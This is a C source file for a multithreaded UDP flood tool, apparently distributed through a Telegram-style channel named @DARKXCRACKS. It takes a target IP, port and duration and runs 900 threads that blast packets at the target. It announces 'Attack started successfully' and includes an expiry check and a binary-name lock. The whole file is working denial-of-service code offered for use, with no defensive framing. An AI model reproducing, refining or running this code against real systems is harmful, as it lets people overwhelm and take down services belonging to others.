#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#include <libgen.h>

#define BUFFER_SIZE 9000
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 2
#define EXPIRATION_DAY 30
#define DEFAULT_THREADS 900
#define EXPECTED_PROGRAM_NAME "danger"  // Set the expected program name here

char *ip;
int port;
int duration;
char padding_data[2 * 1024 * 1024];

// Function to calculate CRC32 checksum
unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

// Check expiration date
void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;
    time(&now);
    if (difftime(now, mktime(&expiration_date)) > 0) {
        printf("This file is closed by @DARKXCRACKS.\nJOIN CHANNEL TO UPDATED FILE.\n");
        exit(EXIT_FAILURE);
    }
}

// Function to check if the program name matches
void check_program_name(int argc, char *argv[]) {
    char *program_name = basename(argv[0]);  // Get the program name
    if (strcmp(program_name, EXPECTED_PROGRAM_NAME) != 0) {
        printf("This binary must named 'danger' to use.\n");
        exit(EXIT_FAILURE);
    }
}

// Function to send UDP traffic
void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    cpu_set_t cpuset;

    // Set thread affinity to the current CPU
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    // Silently check if the address is valid without printing any error
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        pthread_exit(NULL);  // Exit the thread silently if the address is invalid
    }

    snprintf(buffer, sizeof(buffer), "UDP traffic test");

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    // Send UDP packets for the given duration
    while (time(NULL) < end_time) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Main function
int main(int argc, char *argv[]) {
    check_expiration();
    check_program_name(argc, argv);  // Check if the program name matches

    // Check for correct number of arguments
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = DEFAULT_THREADS;  // Always use default threads

    memset(padding_data, 0, sizeof(padding_data));

    // Calculate CRC32 for "DEVIL" (hidden)
    unsigned long crc = calculate_crc32("DEVIL");

    // Print attack details and success message
    printf("Attack started successfully\n");
    printf("IP: %s\n", ip);
    printf("Port: %d\n", port);
    printf("Time: %d seconds\n", duration);
    printf("Threads: %d\n", threads);
    printf("JOIN @DARKXCRACKS\n");

    pthread_t tid[threads];

    // Create threads to send UDP traffic
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    // Final message
    printf("Attack finished.\n");

    return 0;
}